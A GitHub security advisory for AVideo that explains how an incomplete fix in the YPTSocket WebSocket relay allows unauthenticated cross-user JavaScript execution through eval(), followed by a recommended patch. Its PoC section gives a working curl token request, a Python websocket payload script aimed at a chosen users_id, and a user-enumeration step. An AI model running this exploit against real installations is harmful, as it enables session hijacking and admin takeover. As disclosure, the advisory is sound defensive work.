# [H] AVideo has an Incomplete Fix for YPTSocket autoEvalCodeOnHTML Strip: Unauthenticated Cross-User JavaScript Execution via `$msg['json']` Relay Bypass

## Summary
Severity: High
Advisory: GHSA-ghcv-22jf-vfxm
CVE: CVE-2026-43874
CWE: CWE-94
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-ghcv-22jf-vfxm
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The server-side mitigation for the YPTSocket `autoEvalCodeOnHTML` eval sink (prior advisory GHSA-gph2-j4c9-vhhr, commit `c08694bf6`) only strips the payload when it sits under `$json['msg']`, but the relay function `msgToResourceId()` selects the outbound message from `$msg['json']` *before* `$msg['msg']`. An unauthenticated attacker can obtain a WebSocket token from `plugin/YPTSocket/getWebSocket.json.php`, connect to the WebSocket server, and send a message with `autoEvalCodeOnHTML` nested under a top-level `json` field — the strip branch is skipped, the relay delivers the payload verbatim to any logged-in user identified by `to_users_id`, and the client script runs it through `eval()`.

## Details

### Entry point (unauthenticated)

`plugin/YPTSocket/getWebSocket.json.php` (lines 1–21) issues a valid WebSocket token to any caller, with no authentication or CSRF check:

```php
$obj->webSocketToken = getEncryptedInfo(0);
$obj->webSocketURL = YPTSocket::getWebSocketURL();
die(json_encode($obj));
```

`getEncryptedInfo()` defaults to `sentFrom = 'browser'` and a non-CLI flag (`plugin/YPTSocket/functions.php:3-47`), so a token minted for an anonymous browser client will cause the strip branch below to run — which is exactly what we want to audit.

### Incomplete strip (the fix from commit c08694bf6)

`plugin/YPTSocket/Message.php:236-247`:

```php
// Strip eval-able fields from browser/guest messages.
if (empty($msgObj->isCommandLineInterface) && ($msgObj->sentFrom ?? '') !== 'php') {
    if (is_array($json['msg'] ?? null)) {
        unset($json['msg']['autoEvalCodeOnHTML']);          // <-- only strips $json['msg']
    }
    if (isset($json['callback']) && !preg_match('/^[a-zA-Z_][a-zA-Z0-9_]*$/', (string)$json['callback'])) {
        unset($json['callback']);
    }
}
```

If the incoming `$json['msg']` is a scalar (e.g. the string `"x"`), `is_array(...)` is false and the strip is skipped entirely. Any eval-able content that lives elsewhere in `$json` passes through untouched. The same flawed check exists in `plugin/YPTSocket/MessageSQLiteV2.php:285-293`.

### Relay preference picks the untouched field

`plugin/YPTSocket/Message.php:316-322` (and the mirror at `MessageSQLiteV2.php:396-402`):

```php
if (!empty($msg['json'])) {
    $obj['msg'] = $msg['json'];          // <-- preferred carrier; never stripped
} else if (!empty($msg['msg'])) {
    $obj['msg'] = $msg['msg'];
} else {
    $obj['msg'] = $msg;
}
```

An attacker payload shaped as `{"msg": "x", "json": {"autoEvalCodeOnHTML": "<js>"}, "to_users_id": <victim>}` therefore:

1. Passes `switch ($json->msg)` into the `default` case (Message.php:211, 228).
2. `msgToArray($json)` converts to array. The strip branch enters because `sentFrom === 'browser'`, but `is_array("x")` is false and the strip is skipped.
3. Routing lands on `msgToUsers_id($json, $json['to_users_id'])` (Message.php:253), which for each matching resource calls `msgToResourceId($msg, $resourceId)` (Message.php:379).
4. In `msgToResourceId`, `!empty($msg['json'])` is true, so `$obj['msg']` becomes `{"autoEvalCodeOnHTML": "<js>"}` (Message.php:316-317).
5. The `shouldPropagateInfo()` check at Message.php:287-289 only logs — it does not return — so delivery proceeds regardless.

### Client-side sink

`plugin/YPTSocket/script.js:573-575`:

```js
if (json.msg?.autoEvalCodeOnHTML !== undefined) {
    eval(json.msg.autoEvalCodeOnHTML);
}
```

Any logged-in user with an active browser tab runs the attacker-supplied JavaScript in the origin of the AVideo installation.

### Routing to any user

`msgToUsers_id()` (Message.php:362-389) looks up `to_users_id` against `$this->clientsUsersId` and relays to every resource belonging to that user. Because `to_users_id` comes straight from attacker input, any currently connected user (regular or admin) can be targeted. Active users_id values can be enumerated via the existing `getClientsList` request handled at Message.php:219-224 using the same unauthenticated token.

## PoC

Step 1 — mint an unauthenticated WebSocket token:

```bash
curl -sk 'https://target/plugin/YPTSocket/getWebSocket.json.php'
# {"error":false,"webSocketToken":"<TOKEN>","webSocketURL":"wss://target:2053?webSocketToken=<TOKEN>&isCommandLine=0", ...}
```

Step 2 — connect and send the crafted message:

```python
import json, ssl, websocket

TOKEN  = '<TOKEN>'          # from step 1
URL    = 'wss://target:2053?webSocketToken=' + TOKEN + '&isCommandLine=0'
VICTIM = 2                  # any logged-in users_id with an open tab

ws = websocket.create_connection(URL, sslopt={'cert_reqs': ssl.CERT_NONE})
payload = {
    'msg': 'x',                                                  # scalar -> strip branch skipped
    'webSocketToken': TOKEN,
    'json': {'autoEvalCodeOnHTML': "alert('XSS in '+document.domain)"},
    'to_users_id': VICTIM,
}
ws.send(json.dumps(payload))
ws.close()
```

Expected result: the victim's tab receives `{"type":"DEFAULT_MESSAGE","msg":{"autoEvalCodeOnHTML":"alert(...)"}, ...}` and executes the JavaScript via `eval()`.

Optional Step 0 — enumerate active users (using the same token):

```python
ws.send(json.dumps({'msg': 'getClientsList', 'webSocketToken': TOKEN}))
# response lists active users_id values
```

## Impact

- **Unauthenticated XSS / arbitrary JS execution in any logged-in user's browser session.** The victim only needs a tab open on the site — no click, no link, no CSRF.
- **Same-origin compromise:** the attacker's JS runs in the target origin, so it can read DOM/tokens, make authenticated XHR calls on the victim's behalf, and exfiltrate session data.
- **Privilege escalation when an admin is targeted:** arbitrary admin-panel actions via same-origin XHR — account takeover, plugin configuration changes, file uploads, etc.
- **Mass exploitation feasible:** `getClientsList` (also reachable with the anonymous token) enumerates active `users_id` values, and the attacker can iterate `to_users_id` across all of them.
- This is an incomplete fix for GHSA-gph2-j4c9-vhhr — deployments that patched to commit `c08694bf6` remain exploitable.

## Recommended Fix

Scrub `autoEvalCodeOnHTML` from **every** outbound carrier the relay may choose, not only from `$json['msg']`. Patch both `plugin/YPTSocket/Message.php` and `plugin/YPTSocket/MessageSQLiteV2.php`. For example, replace the current strip in `onMessage()`:

```php
if (empty($msgObj->isCommandLineInterface) && ($msgObj->sentFrom ?? '') !== 'php') {
    foreach (['msg', 'json'] as $k) {
        if (is_array($json[$k] ?? null)) {
            unset($json[$k]['autoEvalCodeOnHTML']);
        }
    }
    // also strip a top-level field so the fallback `$obj['msg'] = $msg` path is safe
    if (isset($json['autoEvalCodeOnHTML'])) {
        unset($json['autoEvalCodeOnHTML']);
    }
    if (isset($json['callback']) && !preg_match('/^[a-zA-Z_][a-zA-Z0-9_]*$/', (string)$json['callback'])) {
        unset($json['callback']);
    }
}
```

Additionally, harden the relay itself in `msgToResourceId()` (both files) so future regressions cannot reintroduce the sink — walk the chosen `$obj['msg']` recursively and unset `autoEvalCodeOnHTML` whenever the message originated from a non-PHP, non-CLI client. As defense in depth, remove or gate the client-side `eval(json.msg.autoEvalCodeOnHTML)` at `plugin/YPTSocket/script.js:573-575` behind a server-signed field rather than a plain JSON key.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-ghcv-22jf-vfxm
- https://nvd.nist.gov/vuln/detail/CVE-2026-43874
- https://github.com/WWBN/AVideo/commit/9f3006f9a89a34daa67a83c6ad35f450cb91fcce
- https://github.com/WWBN/AVideo
- https://github.com/advisories/GHSA-gph2-j4c9-vhhr
